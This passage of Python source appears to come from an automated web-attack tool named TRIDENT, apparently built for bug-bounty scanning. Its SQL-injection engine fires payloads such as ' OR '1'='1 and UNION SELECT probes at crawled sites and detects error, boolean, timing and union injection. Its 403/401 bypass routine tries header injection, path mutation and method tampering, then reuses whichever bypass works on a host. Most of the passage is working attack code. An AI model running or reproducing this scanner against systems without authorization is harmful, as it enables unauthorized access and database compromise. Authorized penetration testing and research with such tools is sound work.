                 use_ai=True, ai_severity=True, headers_dir=None,
                 cli_headers=None, no_auth=False, max_payloads_per_ip=50,
                 allow_destructive=False, confirm_medium=True,
                 method_fuzz=False, bypass_403=True, header_set="minimal",
                 path_mode="id_like", smoke_test=True, ai_provider=None,
                 max_bypass_attempts=40):

        self.program_dir = Path(program_dir)
        self.sites_root = Path(sites_root or (self.program_dir / "sites"))
        self.findings_root = self.program_dir / "findings" / "sqli"
        self.findings_root.mkdir(parents=True, exist_ok=True)

        self.max_workers = max_workers
        self.delay = delay
        self.timeout = timeout
        self.waf_hint = waf_hint
        self.dbms_hint = dbms_hint
        self.time_threshold = time_threshold
        self.confirm_timing = confirm_timing
        self.min_severity = (min_severity or "low").lower()
        self.max_payloads_per_ip = int(max_payloads_per_ip or 0)
        self.allow_destructive = allow_destructive
        self.confirm_medium = confirm_medium
        self.method_fuzz = method_fuzz
        self.bypass_403_enabled = bypass_403
        self.smoke_test_enabled = smoke_test
        self.header_set = header_set
        self.path_mode = path_mode
        self.max_bypass_attempts = max_bypass_attempts
        self.enabled_headers = HEADER_SETS.get(header_set,
                                                HEADER_SETS["minimal"])

        # Header jar
        self.header_jar = None
        if not no_auth:
            hdir = Path(headers_dir) if headers_dir else (self.program_dir / "headers")
            try:
                self.header_jar = HeaderJar(hdir, cli_headers=cli_headers or {})
                self.header_jar.load()
            except Exception as e:
                log(f"HeaderJar init failed: {e}", "warn", "SQLI")
                self.header_jar = None

        self.static_headers = {}
        if cookie:
            self.static_headers["Cookie"] = cookie
        if user_agent:
            self.static_headers["User-Agent"] = user_agent

        # AI — auto-detect from .env
        self.ai = None
        self.use_ai = use_ai
        self.ai_severity = ai_severity
        if use_ai:
            try:
                self.ai = AIClient(prefer=ai_provider)
            except Exception as e:
                log(f"AI client init failed: {e}", "warn", "SQLI")
                self.ai = None

        # State
        self._payload_cache = None
        self._bypass_cache = None
        self._bypass_lock = threading.Lock()
        self.seen_sigs = set()
        self._seen_lock = threading.Lock()
        self.host_backoff = {}
        self.host_last = {}
        self._throttle_lock = threading.Lock()
        self.host_waf = {}
        self.host_403 = {}
        self.host_bypass = {}   # host -> winning bypass dict
        self._host_lock = threading.Lock()
        self.ai_dropped = []
        self._drop_lock = threading.Lock()
        self._auth_window = {}
        self.host_auth_expired = {}
        self._auth_lock = threading.Lock()

    # --------------------------------------------------------------- #
    #  Session headers
    # --------------------------------------------------------------- #
    def _headers_for(self, url):
        if self.header_jar is not None:
            merged = self.header_jar.headers_for(url)
            merged.update(self.static_headers)
            return merged
        return dict(self.static_headers)

    def _throttle(self, url):
        host = urlparse(url).netloc.lower()
        with self._auth_lock:
            if self.host_auth_expired.get(host):
                return False
        with self._throttle_lock:
            now = time.time()
            backoff = self.host_backoff.get(host, 0.0)
            if now < backoff:
                wait = backoff - now
                if wait > 60:
                    return False
                time.sleep(min(wait, 30))
                now = time.time()
            last = self.host_last.get(host, 0.0)
            wait = self.delay - (now - last)
            if wait > 0:
                time.sleep(wait)
            self.host_last[host] = time.time()
            return True

    def _note_rate_limit(self, host, retry_after):
        with self._throttle_lock:
            self.host_backoff[host] = time.time() + max(float(retry_after or 5.0), 5.0)

    def _note_response(self, host, status):
        with self._auth_lock:
            window = self._auth_window.setdefault(host, [])
            window.append(1 if status == 401 else 0)
            if len(window) > 20:
                window.pop(0)
            if len(window) >= 20 and sum(window) / 20.0 >= AUTH_EXPIRY_THRESHOLD:
                if not self.host_auth_expired.get(host):
                    self.host_auth_expired[host] = True
                    log(f"auth expired on {host} — {sum(window)}/20 recent 401s",
                        "err", "SQLI")

    # --------------------------------------------------------------- #
    #  403 BYPASS  (uses payloads/403.yaml)
    # --------------------------------------------------------------- #
    def _load_bypass_set(self):
        if self._bypass_cache is None:
            with self._bypass_lock:
                if self._bypass_cache is None:
                    self._bypass_cache = load_payloads("403")
                    n = payload_count(self._bypass_cache)
                    log(f"403 bypass set: {n} payloads loaded", "info", "SQLI")
        return self._bypass_cache

    @staticmethod
    def _sub_403(template, url):
        """
        Substitute 403 placeholders. {{PATH}} here is WITHOUT leading slash,
        so `//{{PATH}}` → `//admin/foo` (correct double-slash prefix).
        """
        if not template:
            return template
        p = urlparse(url)
        full = p.path or "/"
        noslash = full.lstrip("/")
        mixed = "".join(c.upper() if i % 2 else c.lower()
                        for i, c in enumerate(noslash))
        subs = {
            "{{URL}}":            url,
            "{{FULL_URL}}":       url,
            "{{BASE_URL}}":       f"{p.scheme}://{p.netloc}",
            "{{HOST}}":           p.netloc,
            "{{PATH}}":           noslash,
            "{{PATH_FULL}}":      full,
            "{{PATH_UPPER}}":     noslash.upper(),
            "{{PATH_MIXED}}":     mixed,
            "{{PATH_FULLWIDTH}}": full.replace("/", "\uff0f"),
            "{{URL_V1}}":         re.sub(r"/v\d+/", "/v1/", url, count=1),
            "{{QUERY}}":          p.query or "",
        }
        for k, v in subs.items():
            template = template.replace(k, v)
        return template

    def _build_bypass_request(self, ip, entry, base_headers):
        """
        Return (url, headers, method) for a 403.yaml entry.
        Handles header injection, path mutation, method override.
        """
        url = ip.url
        headers = dict(base_headers or {})
        method = get_method(entry, default=ip.method)

        # Single header injection
        h_name, h_val = get_header_injection(entry)
        if h_name:
            headers[h_name] = self._sub_403(h_val, url)

        # Multi-header injection
        for k, v in get_headers_map(entry).items():
            headers[k] = self._sub_403(str(v), url)

        # Path mutation / request target replacement
        raw = get_payload_string(entry)
        req_target = get_request_target(entry)
        mutation = req_target if req_target else raw
        if mutation:
            mutated = self._sub_403(mutation, url)
            # If the mutation does not contain a scheme, prepend base origin
            if "://" not in mutated:
                p = urlparse(url)
                if mutated.startswith("//"):
                    url = f"{p.scheme}:{mutated}"
                elif mutated.startswith("/"):
                    url = f"{p.scheme}://{p.netloc}{mutated}"
                else:
                    url = f"{p.scheme}://{p.netloc}/{mutated}"
            else:
                url = mutated

        return url, headers, method

    def try_403_bypass(self, ip, base_headers, baseline_resp):
        """
        On 403/401 — load 403.yaml, route by WAF fingerprint, fire every
        applicable bypass. On first 2xx/3xx, cache the winning combo for
        this host and return (winning_headers, winning_url, entry).
        """
        if not self.bypass_403_enabled:
            return None
        host = urlparse(ip.url).netloc.lower()

        # Reuse a previously discovered bypass for this host
        with self._host_lock:
            cached = self.host_bypass.get(host)
        if cached:
            return cached

        bypass_set = self._load_bypass_set()
        if not bypass_set:
            return None

        # Detect WAF from the 403 response
        waf_name = None
        if baseline_resp is not None:
            try:
                waf_name = detect_waf(baseline_resp.headers)
            except Exception:
                waf_name = None
        if not waf_name and self.waf_hint:
            waf_name = self.waf_hint

        # Route by priority
        ordered = []
        seen_ids = set()

        def add(entries):
            for e in entries:
                eid = e.get("id")
                if eid and eid in seen_ids:
                    continue
                if eid:
                    seen_ids.add(eid)
                ordered.append(e)

        if waf_name:
            add(filter_payloads(bypass_set, waf=waf_name, risk="safe"))
        add(filter_payloads(bypass_set, category="header_injection", risk="safe"))
        add(filter_payloads(bypass_set, category="path_manipulation", risk="safe"))
        add(filter_payloads(bypass_set, category="method_tampering", risk="safe"))
        add(filter_payloads(bypass_set, category="protocol_manipulation", risk="safe"))
        add(filter_payloads(bypass_set, category="proxy_specific", risk="safe"))
        add(filter_payloads(bypass_set, category="advanced_combination", risk="safe"))
        add(filter_payloads(bypass_set, category="legacy", risk="safe"))

        ordered = ordered[:self.max_bypass_attempts]

        for entry in ordered:
            mutated_url, mutated_headers, mutated_method = \
                self._build_bypass_request(ip, entry, base_headers)
            try:
                resp = send_request(mutated_url, method=mutated_method,
                                    headers=mutated_headers,
                                    timeout=self.timeout,
                                    allow_redirects=False)
            except Exception:
                continue
            if resp is None:
                continue
            if 200 <= resp.status_code < 400:
                winning = {
                    "headers": mutated_headers,
                    "url": mutated_url,
                    "entry_id": entry.get("id"),
                    "technique": entry.get("technique"),
                }
                with self._host_lock:
                    self.host_bypass[host] = winning
                log(f"403 BYPASS on {host}: {entry.get('id')} "
                    f"[{entry.get('technique')}] → HTTP {resp.status_code}",
                    "hit", "SQLI")
                return winning

        return None

    # --------------------------------------------------------------- #
    #  Payload filtering
    # --------------------------------------------------------------- #
    def load_payloads_filtered(self):
        data = load_payloads("sqli")
        raw_count = payload_count(data)

        # Apply filters via trident_utils helper
        entries = filter_payloads(
            data,
            dbms=self.dbms_hint,
            waf=self.waf_hint,
            include_aggressive=self.allow_destructive,
        )

        # Drop destructive if not allowed (belt & suspenders — the helper
        # already handles it, but tags are sometimes missing)
        clean = []
        seen_hashes = set()
        for e in entries:
            tags = set(t.lower() for t in (e.get("tags") or []))
            if not self.allow_destructive and (tags & DESTRUCTIVE_TAGS):
                continue
            ph = _ph(get_payload_string(e))
            if ph in seen_hashes:
                continue
            seen_hashes.add(ph)
            clean.append(e)

        clean.sort(key=lambda e: PAYLOAD_PRIORITY.get(
            e.get("category", "unknown"), 99))

        log(f"payloads: {raw_count} loaded → {len(clean)} after filter "
            f"(waf={self.waf_hint or '—'} dbms={self.dbms_hint or '—'})",
            "ok", "SQLI")
        self._payload_cache = clean
        return clean

    # --------------------------------------------------------------- #
    #  Baseline + smoke test
    # --------------------------------------------------------------- #
    def _smoke(self, ip):
        base_fp = ip.baseline_fp or _fp(ip.baseline_resp)
        session = self._headers_for(ip.url)
        for label, probe in (("garbage", "TRIDENT" + secrets.token_hex(4)),
                              ("quote", "'"),
                              ("bool", "' OR '1'='1")):
            if not self._throttle(ip.url):
                return False
            try:
                r = build_request(ip, probe, timeout=self.timeout,
                                  extra_headers=session)
            except Exception:
                continue
            if r is None:
                continue
            fp = _fp(r)
            if fp.get("status") != base_fp.get("status"):
                return True
            if fp.get("hash") != base_fp.get("hash") and \
                    abs(fp.get("length", 0) - base_fp.get("length", 0)) > 30:
                return True
        return False

    def capture_baseline(self, ip):
        session = self._headers_for(ip.url)
        samples = []
        first_status = None

        for _ in range(2):
            if not self._throttle(ip.url):
                ip.stable = False
                return
            try:
                r = build_request(ip, ip.value, timeout=self.timeout,
                                  extra_headers=session)
            except Exception:
                r = None
            if r is not None and first_status is None:
                first_status = r.status_code
            samples.append(_fp(r))

        # 403/401 — try bypass first
        if first_status in (401, 403):
            host = urlparse(ip.url).netloc.lower()
            with self._host_lock:
                self.host_403[host] = self.host_403.get(host, 0) + 1
            baseline_resp = None
            try:
                baseline_resp = build_request(ip, ip.value, timeout=self.timeout,
                                               extra_headers=session)
            except Exception:
                pass
            bypass = self.try_403_bypass(ip, session, baseline_resp)
            if bypass:
                ip.bypass_headers = bypass["headers"]
                ip.bypass_url = bypass["url"]
                ip.bypass_entry = bypass
                # Retry baseline with the winning bypass
                ip.extra_headers.update(bypass["headers"])
                ip.url = bypass["url"]
                try:
                    ip.baseline_resp = send_request(
                        bypass["url"], method=ip.method,
                        headers=bypass["headers"], timeout=self.timeout,
                        allow_redirects=False)
                except Exception:
                    ip.baseline_resp = None
                ip.baseline_fp = _fp(ip.baseline_resp)
                ip.baseline_body = ((ip.baseline_resp.text or "")
                                     if ip.baseline_resp else "")[:12000]
                ip.stable = True
                ip.worth_testing = True
                # Capture timing baseline quickly
                self._capture_timing(ip)
                return

        # Normal baseline
        try:
            ip.baseline_resp = build_request(ip, ip.value,
                                              timeout=self.timeout,
                                              extra_headers=session)
        except Exception:
            ip.baseline_resp = None
        ip.baseline_fp = _fp(ip.baseline_resp)
        ip.baseline_body = ((ip.baseline_resp.text or "")
                             if ip.baseline_resp else "")[:12000]

        # Stability
        if len(samples) == 2 and samples[0]["hash"] and samples[1]["hash"]:
            if samples[0]["hash"] != samples[1]["hash"] and \
                    abs(samples[0]["length"] - samples[1]["length"]) > 100:
                ip.stable = False
            if samples[0]["length"] < 50:
                ip.stable = False
        else:
            ip.stable = False

        # Timing baseline + smoke test
        self._capture_timing(ip)

        if self.smoke_test_enabled:
            try:
                ip.worth_testing = self._smoke(ip)
            except Exception:
                ip.worth_testing = True

    def _capture_timing(self, ip):
        session = self._headers_for(ip.url)
        samples = []
        for _ in range(3):
            if not self._throttle(ip.url):
                break
            t0 = time.time()
            try:
                build_request(ip, ip.value, timeout=self.timeout,
                              extra_headers=session)
            except Exception:
                pass
            samples.append(time.time() - t0)
        if samples:
            ip.timing_baseline = statistics.median(samples)
            ip.timing_stddev = statistics.stdev(samples) if len(samples) > 1 else 0.0
        else:
            ip.timing_baseline = 0.5
            ip.timing_stddev = 0.2

    # --------------------------------------------------------------- #
    #  Detection strategies
    # --------------------------------------------------------------- #
    def _test_error(self, ip, resp):
        try:
            body = resp.text or ""
        except Exception:
            body = ""
        if not body:
            return None
        baseline_low = ip.baseline_body.lower() if ip.baseline_body else ""
        for dbms, patterns in get_signatures().items():
            for rx in patterns:
                m = rx.search(body)
                if not m:
                    continue
                matched = m.group(0)[:160].lower()
                if matched in baseline_low:
                    continue
                start = max(0, m.start() - 80)
                end = min(len(body), m.end() + 200)
                return {
                    "confidence": "high",
                    "subtype": "error_based",
                    "reason": f"DBMS error signature matched ({dbms})",
                    "dbms": dbms,
                    "evidence": body[start:end],
                    "verification_method": "error_signature",
                }
        return None

    def _test_boolean(self, ip, true_p, false_p):
        session = self._headers_for(ip.url)
        try:
            rt = build_request(ip, true_p, timeout=self.timeout,
                                extra_headers=session)
            if not self._throttle(ip.url):
                return None
            time.sleep(0.08)
            rf = build_request(ip, false_p, timeout=self.timeout,
                                extra_headers=session)
        except Exception:
            return None
        if rt is None or rf is None:
            return None
        tfp, ffp = _fp(rt), _fp(rf)
        base = ip.baseline_fp or {}
        ctrl = ip.control_fp or {}
        if not _fp_differ(tfp, ffp, min_len_delta=100):
            return None
        tb = _fp_differ(tfp, base, min_len_delta=100)
        fb = _fp_differ(ffp, base, min_len_delta=100)
        if not (tb or fb):
            return None
        # If TRUE matches garbage and FALSE differs, this is just value-sensitivity
        if ctrl.get("hash") and tfp["hash"] == ctrl["hash"] and \
                ffp["hash"] != ctrl["hash"] and tfp["hash"] == base.get("hash"):
            return None
        return {
            "confidence": "high",
            "subtype": "boolean_blind",
            "reason": "Boolean pair — TRUE and FALSE produce different responses",
            "dbms": self.dbms_hint,
            "evidence": f"true_len={tfp['length']} false_len={ffp['length']} "
                        f"base_len={base.get('length', 0)} "
                        f"ctrl_len={ctrl.get('length', 0)}",
            "verification_method": "boolean_pair",
        }

    def _test_timing(self, ip, payload, first_elapsed):
        base = ip.timing_baseline
        if base is None:
            return None
        threshold = max(self.time_threshold,
                        base + 3.0 * (ip.timing_stddev or 0.2) + 2.0)
        delta = first_elapsed - base
        if delta < threshold - 2.0:
            return None
        if not self.confirm_timing:
            if delta >= threshold:
                return {"confidence": "medium", "subtype": "time_based",
                        "reason": f"Time delay {first_elapsed:.2f}s "
                                  f"(baseline {base:.2f}s)",
                        "dbms": self.dbms_hint,
                        "evidence": f"delay=+{delta:.2f}s",
                        "verification_method": "timing_unconfirmed"}
            return None

        session = self._headers_for(ip.url)
        repro = 0
        for _ in range(2):
            if not self._throttle(ip.url):
                break
            t0 = time.time()
            try:
                build_request(ip, payload, timeout=self.timeout + 4,
                              extra_headers=session)
            except Exception:
                continue
            if (time.time() - t0 - base) >= threshold - 2.0:
                repro += 1
            time.sleep(0.2)
        if repro < 2:
            return None
        return {"confidence": "high", "subtype": "time_based",
                "reason": f"Time-based SQLi confirmed — "
                          f"{first_elapsed:.2f}s initial ({repro}/2 repro)",
                "dbms": self.dbms_hint,
                "evidence": f"base={base:.2f}s first={first_elapsed:.2f}s "
                            f"repro={repro}/2",
                "verification_method": "timing_confirmed"}

    def _test_union(self, ip, base_payload, resp):
        base = ip.baseline_fp
        if not base or not base.get("hash"):
            return None
        ctrl = ip.control_fp or {}
        # Endpoint reacts to garbage → union unreliable
        if ctrl.get("hash") and ctrl["hash"] != base["hash"] and \
                abs(ctrl.get("length", 0) - base.get("length", 0)) > 100:
            return None

        prefix = base_payload
        if "--" in prefix:
            prefix = prefix[:prefix.index("--")].rstrip()
        contexts = []
        if prefix.startswith("'"):
            contexts = [("single_quote", prefix)]
        elif prefix.startswith('"'):
            contexts = [("double_quote", prefix)]
        else:
            contexts = [("numeric", prefix),
                        ("single_quote", "' " + prefix)]

        session = self._headers_for(ip.url)
        for ctx, pfx in contexts[:2]:
            for n in range(1, 9):
                marker = _marker()
                cols = ["'" + marker + "'"] + ["NULL"] * (n - 1)
                probe = f"{pfx} UNION SELECT {','.join(cols)}-- "
                if not self._throttle(ip.url):
                    return None
                try:
                    r = build_request(ip, probe, timeout=self.timeout,
                                      extra_headers=session)
                except Exception:
                    continue
                if r is None:
                    continue
                try:
                    body = r.text or ""
                except Exception:
                    body = ""
                if marker in body:
                    return {"confidence": "high", "subtype": "union_based",
                            "reason": f"UNION SELECT confirmed — marker "
                                      f"'{marker}' reflected",
                            "dbms": self.dbms_hint,
                            "evidence": f"context={ctx} cols={n} marker={marker}",
                            "verification_method": "union_confirmed",
                            "column_count": n,
                            "union_payload": probe,
                            "union_marker": marker,
                            "union_context": ctx}
        return None

    def _test_status(self, ip, resp):
        base = ip.baseline_resp
        if base is None or resp is None:
            return None
        if base.status_code < 500 and resp.status_code >= 500:
            try:
                body = resp.text or ""
            except Exception:
                body = ""
            if GENERIC_500_RE.search(body):
                return {"confidence": "medium", "subtype": "status_escalation",
                        "reason": f"Status escalated "
                                  f"{base.status_code} → {resp.status_code}",
                        "dbms": None, "evidence": body[:400],
                        "verification_method": "status_escalation"}
        return None

    def _test_body_diff(self, ip, resp):
        if not ip.stable or not ip.baseline_fp or not ip.baseline_fp.get("hash"):
            return None
        ctrl = ip.control_fp or {}
        if ctrl.get("hash") and ctrl["hash"] != ip.baseline_fp["hash"] and \
                abs(ctrl.get("length", 0) - ip.baseline_fp["length"]) > 200:
            return None
        cur = _fp(resp)
        if not _fp_differ(cur, ip.baseline_fp, min_len_delta=500):
            return None
        delta = cur["length"] - ip.baseline_fp["length"]
        if delta < 500:
            return None
        return {"confidence": "low", "subtype": "body_diff",
                "reason": f"Response grew by {delta} bytes",
                "dbms": None,
                "evidence": f"baseline={ip.baseline_fp['length']} current={cur['length']}",
                "verification_method": "body_diff"}

    # --------------------------------------------------------------- #
    #  Single payload test
    # --------------------------------------------------------------- #
    def test_payload(self, ip, entry):
        if self.max_payloads_per_ip and ip.payloads_tested >= self.max_payloads_per_ip:
            return None
        if ip.high_confidence_hit:
            return None
        if not self._throttle(ip.url):
            return None

        payload = get_payload_string(entry)
        if not payload:
            return None
        payload = substitute_placeholders(payload)
        category = (entry.get("category") or "").lower()
        is_time = bool(TIME_PAYLOAD_RE.search(payload))
        is_union = bool(UNION_PAYLOAD_RE.search(payload))
        is_bool = "boolean" in category or "boolean" in (entry.get("tags") or [])

        session = self._headers_for(ip.url)
        t0 = time.time()
        try:
            resp = build_request(ip, payload, timeout=self.timeout + 4,
                                  extra_headers=session)
        except Exception:
            return None
        elapsed = time.time() - t0
        ip.payloads_tested += 1

        if resp is None:
            return None

        host = urlparse(ip.url).netloc.lower()
        self._note_response(host, resp.status_code)

        if resp.status_code == 429:
            self._note_rate_limit(host, resp.headers.get("Retry-After"))
            return None
        if resp.status_code in (403, 406):
            waf = None
            try:
                waf = detect_waf(resp.headers)
            except Exception:
                pass
            if waf:
                with self._host_lock:
                    self.host_waf[host] = waf
            return None

        # Priority order — first hit wins
        hit = self._test_error(ip, resp)
        if hit:
            return self._finalize(ip, entry, hit, resp, elapsed, payload)

        if is_bool:
            opp = _opposite(payload)
            if opp and opp != payload:
                pair_sig = _ph(payload) + ":" + _ph(opp)
                with self._seen_lock:
                    if pair_sig in self.seen_sigs:
                        opp = None
                    else:
                        self.seen_sigs.add(pair_sig)
                if opp:
                    hit = self._test_boolean(ip, payload, opp)
                    if hit:
                        return self._finalize(ip, entry, hit, resp,
                                              elapsed, payload)

        if is_time:
            hit = self._test_timing(ip, payload, elapsed)
            if hit:
                return self._finalize(ip, entry, hit, resp, elapsed, payload)

        if is_union and not is_time:
            hit = self._test_union(ip, payload, resp)
            if hit:
                return self._finalize(ip, entry, hit, resp, elapsed, payload)

        hit = self._test_status(ip, resp)
        if hit:
            hit = self._confirm_medium(ip, payload, hit)
            if hit:
                return self._finalize(ip, entry, hit, resp, elapsed, payload)

        if not is_time and not is_union and resp.status_code < 500:
            hit = self._test_body_diff(ip, resp)
            if hit:
                return self._finalize(ip, entry, hit, resp, elapsed, payload)

        return None

    def _confirm_medium(self, ip, payload, hit):
        if not self.confirm_medium or hit.get("confidence") != "medium":
            return hit
        session = self._headers_for(ip.url)
        if not self._throttle(ip.url):
            return hit
        try:
            r2 = build_request(ip, payload, timeout=self.timeout + 4,
                                extra_headers=session)
        except Exception:
            return hit
        if r2 is None:
            return hit
        if hit.get("verification_method") == "status_escalation":
            if r2.status_code >= 500:
                hit["confidence"] = "high"
                hit["reason"] += " (confirmed on re-fire)"
            else:
                hit["confidence"] = "low"
                hit["reason"] += " (did not reproduce)"
        return hit

    # --------------------------------------------------------------- #
    #  Finalize → build finding
    # --------------------------------------------------------------- #
    def _finalize(self, ip, entry, hit, resp, elapsed, payload):
        confidence = hit["confidence"]
        severity = {"high": "high", "medium": "medium", "low": "low"}.get(
            confidence, "low")
        session = self._headers_for(ip.url)

        baseline_snip = ""
        if ip.baseline_resp is not None:
            try:
                baseline_snip = (ip.baseline_resp.text or "")[:400]
            except Exception:
                baseline_snip = ""

        finding = {
            "type": "sqli",
            "subtype": hit["subtype"],
            "severity": severity,
            "confidence": confidence,
            "confirmed": hit.get("verification_method") in (
                "error_signature", "timing_confirmed",
                "boolean_pair", "union_confirmed"),
            "verification_method": hit.get("verification_method"),

            "url": ip.url,
            "method": ip.method,
            "parameter": ip.name,
            "injection_point": {
                "location": ip.location,
                "name": ip.name,
                "original_value": (ip.value or "")[:200],
                "json_path": ip.json_path,
                "is_header_value": ip.is_header_value,
                "bypass_entry_id": (ip.bypass_entry or {}).get("entry_id"),
                "bypass_technique": (ip.bypass_entry or {}).get("technique"),
            },

            "payload_id":          entry.get("id"),
            "payload_name":        entry.get("name"),
            "payload":             payload,
            "payload_category":    entry.get("category"),
            "payload_dbms":        entry.get("dbms"),
            "payload_tags":        entry.get("tags", []),
            "payload_description": entry.get("description", ""),

            "matched_dbms":     hit.get("dbms"),
            "detection_reason": hit["reason"],
            "evidence":         hit.get("evidence", ""),

            "response_status":  getattr(resp, "status_code", None),
            "response_length":  len(resp.text or "") if resp else None,
            "response_snippet": (resp.text or "")[:800] if resp else "",
            "baseline_status":  (ip.baseline_resp.status_code
                                  if ip.baseline_resp else None),
            "baseline_length":  (len(ip.baseline_resp.text or "")
                                  if ip.baseline_resp else None),
            "baseline_snippet": baseline_snip,
            "baseline_timing":  round(ip.timing_baseline or 0, 3),
            "timing_stddev":    round(ip.timing_stddev or 0, 3),
            "elapsed_seconds":  round(elapsed, 3),

            "curl_command": build_curl(ip, payload, session_headers=session),
            "timestamp": now_iso(),
            "remediation": (
                "Use parameterized queries / prepared statements. Never "
                "concatenate user input into SQL. Apply least-privilege DB "
                "accounts. Validate and whitelist input server-side. "
                "Suppress DBMS error messages in production responses."
            ),
        }

        for k in ("column_count", "union_payload", "union_marker", "union_context"):
            if hit.get(k) is not None:
                finding[f"union_{k}" if not k.startswith("union_") else k] = hit[k]
        if hit.get("column_count") is not None:
            finding["union_column_count"] = hit["column_count"]

        sig = hashlib.md5(
            f"{ip.url}|{ip.name}|{ip.location}|{_ph(payload)}|{confidence}"
            .encode()).hexdigest()
        with self._seen_lock:
            if sig in self.seen_sigs:
                return None
            self.seen_sigs.add(sig)

        # AI triage
        if self.ai and self.ai.available():
            try:
                verdict = self.ai.triage(finding)
                if verdict:
                    finding["ai_triage"] = verdict
                    if (verdict.get("verdict") == "FALSE_POSITIVE"
                            and verdict.get("confidence", 0) >= 0.85):
                        with self._drop_lock:
                            self.ai_dropped.append({
                                "reason": "ai_fp",
                                "url": finding["url"],
                                "parameter": finding["parameter"],
                                "verdict": verdict,
                            })
                        log(f"AI dropped FP: {ip.name} @ {ip.url}",
                            "info", "SQLI")
                        return None
            except Exception as e:
                log(f"AI triage error: {e}", "debug", "SQLI")

        if self.ai_severity and self.ai and self.ai.available():
            try:
                sev = self.ai.severity(finding)
                if sev and sev.get("confidence", 0) >= 0.6:
                    finding["ai_severity"] = sev
                    finding["severity"] = sev["severity"]
            except Exception as e:
                log(f"AI severity error: {e}", "debug", "SQLI")

        # Severity filter
        if SEVERITY_RANK.get(finding["severity"], 1) < \
                SEVERITY_RANK.get(self.min_severity, 0):
            with self._drop_lock:
                self.ai_dropped.append({
                    "reason": "low_severity",
                    "url": finding["url"],
                    "parameter": finding["parameter"],
                    "severity": finding["severity"],
                })
            return None

        # Save
        host = urlparse(ip.url).netloc
        slug = safe_filename(
            (urlparse(ip.url).path or "/").replace("/", "_")
            + "__" + ip.name + "__" + ip.location)
        out_path = (self.findings_root / safe_filename(host)
                    / f"{slug}__{entry.get('id', 'x')}_sqli.json")
        try:
            save_json(out_path, finding)
        except Exception as e:
            log(f"failed to save finding: {e}", "err", "SQLI")
            return None

        # Visual feedback
        sev_col = _sev_color(finding["severity"])
        ai_tag = ""
        if "ai_triage" in finding:
            ai_tag = f" {C.GY}[AI:{finding['ai_triage'].get('verdict','?')}]{C.R}"
        bypass_tag = ""
        if ip.bypass_entry:
            bypass_tag = f" {C.CY}[403→{ip.bypass_entry.get('entry_id')}]{C.R}"
        log(f"{sev_col}◆ {finding['severity'].upper():8}{C.R} "
            f"{ip.location}:{ip.name} @ {ip.url[:90]} "
            f"({entry.get('name')}) → {hit['verification_method']}"
            f"{ai_tag}{bypass_tag}",
            "hit", "SQLI")

        if hit.get("confidence") == "high":
            ip.high_confidence_hit = True
        return finding

    # --------------------------------------------------------------- #
    #  Per-point driver
    # --------------------------------------------------------------- #
    def test_point(self, ip, payloads):
        host = urlparse(ip.url).netloc.lower()
        with self._auth_lock:
            if self.host_auth_expired.get(host):
                return []

        self.capture_baseline(ip)

        if not ip.worth_testing:
            return []
        if ip.baseline_resp is None:
            return []
        # Unresolvable 403/401 → skip
        if ip.baseline_resp.status_code in (401, 403) and not ip.bypass_entry:
            return []

        findings = []
        for entry in payloads:
            if ip.high_confidence_hit:
                break
            if (self.max_payloads_per_ip and
                    ip.payloads_tested >= self.max_payloads_per_ip):
                break
            f = self.test_payload(ip, entry)
            if f:
                findings.append(f)
            if self.delay:
                time.sleep(self.delay * 0.25)   # already throttled per-host
        return findings

    # --------------------------------------------------------------- #
    #  Main
    # --------------------------------------------------------------- #
    def run(self):
        banner()
        section("TRIDENT :: SQLi :: SYSTEM CHECK")

        log(f"version        : trident_utils v{TRIDENT_VERSION}",
            "info", "SQLI")
        log(f"target root    : {self.sites_root}", "info", "SQLI")
        log(f"findings root  : {self.findings_root}", "info", "SQLI")
        log(f"workers        : {self.max_workers}", "info", "SQLI")
        log(f"delay          : {self.delay}s/host", "info", "SQLI")
        log(f"min severity   : {self.min_severity}", "info", "SQLI")
        log(f"max payloads/IP: {self.max_payloads_per_ip or 'unlimited'}",
            "info", "SQLI")
        log(f"header set     : {self.header_set} "
            f"({len(self.enabled_headers)} headers)", "info", "SQLI")
        log(f"path mode      : {self.path_mode}", "info", "SQLI")
        log(f"smoke test     : {'ON' if self.smoke_test_enabled else 'OFF'}",
            "info", "SQLI")
        log(f"method fuzz    : {'ON' if self.method_fuzz else 'OFF'}",
            "info", "SQLI")
        log(f"403 bypass     : {'ON' if self.bypass_403_enabled else 'OFF'}",
            "info", "SQLI")

        # Auth state
        if self.header_jar is not None:
            profiles = self.header_jar.profiles_loaded()
            if profiles:
                log(f"auth           : ON ({len(profiles)} profiles)",
                    "ok", "SQLI")
            else:
                log("auth           : no header profiles found", "info", "SQLI")
        else:
            log("auth           : unauthenticated", "info", "SQLI")

        # AI state
        section("TRIDENT :: SQLi :: AI")
        env_path = find_env_file()
        if env_path:
            log(f".env           : {env_path}", "info", "SQLI")
        else:
            log(".env           : not found", "warn", "SQLI")

        if not self.use_ai:
            log("--no-ai passed → AI triage disabled", "info", "SQLI")
        elif self.ai and self.ai.available():
            log(f"provider       : {self.ai.label} ({self.ai.provider})",
                "ok", "SQLI")
            log(f"model          : {self.ai.model}", "info", "SQLI")
            log("triage         : ON", "info", "SQLI")
            log(f"severity       : {'ON' if self.ai_severity else 'OFF'}",
                "info", "SQLI")
        else:
            log("AI triage      : OFF (no usable provider)", "warn", "SQLI")
            rows = provider_summary()
            for r in rows:
                icon = "ready" if r["usable"] else "--"
                log(f"  {r['label']:16} {icon:6} {r['env_var'] or '(not set)'}",
                    "info", "SQLI")

        # Payloads
        section("TRIDENT :: SQLi :: PAYLOAD VAULT")
        payloads = self.load_payloads_filtered()

        # Pages
        section("TRIDENT :: SQLi :: RECON")
        pages = []
        for jf in self.sites_root.rglob("*.json"):
            if jf.name.startswith("_"):
                continue
            try:
                rec = load_json(jf)
                if rec.get("url") and not _is_static_url(rec["url"]):
                    pages.append(rec)
            except Exception:
                continue
        log(f"pages          : {len(pages)} testable", "ok", "SQLI")

        points = extract_points(
            pages,
            method_fuzz=self.method_fuzz,
            path_mode=self.path_mode,
            enabled_headers=self.enabled_headers,
        )
        points = spread_points(points)

        loc_counts = {}
        for ip in points:
            loc_counts[ip.location] = loc_counts.get(ip.location, 0) + 1
        log(f"injection points: {len(points)}", "ok", "SQLI")
        for loc, n in sorted(loc_counts.items()):
            log(f"  {loc:16} {n}", "info", "SQLI")

        if not points:
            log("nothing to test — exiting", "warn", "SQLI")
            return []

        # Strike
        section("TRIDENT :: SQLi :: STRIKE PHASE")
        all_findings = []
        done = 0
        total = len(points)
        smoke_skipped = [0]
        t0 = time.time()

        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
                futures = {pool.submit(self.test_point, ip, payloads): ip
                            for ip in points}
                for fut in as_completed(futures):
